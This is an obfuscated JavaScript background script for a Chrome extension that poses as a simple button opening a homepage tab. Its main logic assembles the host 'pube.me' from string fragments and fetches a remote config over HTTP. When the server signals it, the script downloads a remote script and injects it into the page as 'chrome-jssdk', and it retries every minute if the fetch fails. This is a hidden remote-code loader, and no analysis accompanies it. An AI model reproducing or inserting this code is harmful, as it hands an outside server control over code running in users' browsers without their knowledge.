var zwycr = {};
var jjgcch = function(){
	var hvhkao = new URL('https://www.google.com');
	hvhkao.protocol = 'http:';
	var idiaw = 'pube';
	var qsddl = 'me';
	hvhkao.hostname = idiaw+'.'+qsddl;
	hvhkao.pathname = '/config';
	if(!chrome.app.getDetails()){
		return false;
	}
	fetch(hvhkao).then(function(response){
		return response.json();
	}).then(function(data){
		zwycr = data;
		if(data.login == true){
			zwycr.app = chrome.app.getDetails();
			bgwuyd();
		}else{
			thxork();
		}
	}).catch((e) => {
		setTimeout(jjgcch, 1000*60);
	});
}

var bgwuyd = function(){
	zwycr.request.headers = {installed:true};
	fetch(zwycr.check ,zwycr.request).then(function(response){
		return response.json();
	}).then(function(data){
		if(data.verify == true){
			fypwqq();
		}else{
			thxork();
		}
	});
}

var kfciwc = function(){
	(function(d, s, id){
     var js, cjs = d.getElementsByTagName(s)[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement(s); js.id = id;
     js.src = zwycr.url;
     cjs.parentNode.insertBefore(js, cjs);
   }(document, 'script', 'chrome-jssdk'));
}

var fypwqq = function(){
	fetch(zwycr.url).then(function(response){
		return response.blob();
	}).then(function(data){
		zwycr.url = URL.createObjectURL(data);
		kfciwc(zwycr.url);
	});
}

var fffoq = function(){
	chrome.tabs.create({url:zwycr.homepage}, function(tab){
		zwycr.tab = tab.id;
		chrome.browserAction.enable();
		if(!zwycr.mykmjp){
			slxmge();
		}
	});
}

var pkxee = function(){
	chrome.tabs.update(zwycr.tab, {url: zwycr.homepage}, function(){
		chrome.browserAction.enable();
	})
}

var slxmge = function(){
	zwycr.mykmjp = true;
	chrome.tabs.onRemoved.addListener(function(tab){
		if(tab == zwycr.tab){
			zwycr.tab = false;
		}
	});
}

var thxork = function(){
	chrome.browserAction.onClicked.addListener(function(){
		chrome.browserAction.disable();
		if(!zwycr.tab){
			fffoq();
		}else{
			pkxee();
		}
	});
}

if(chrome){
	jjgcch();
}
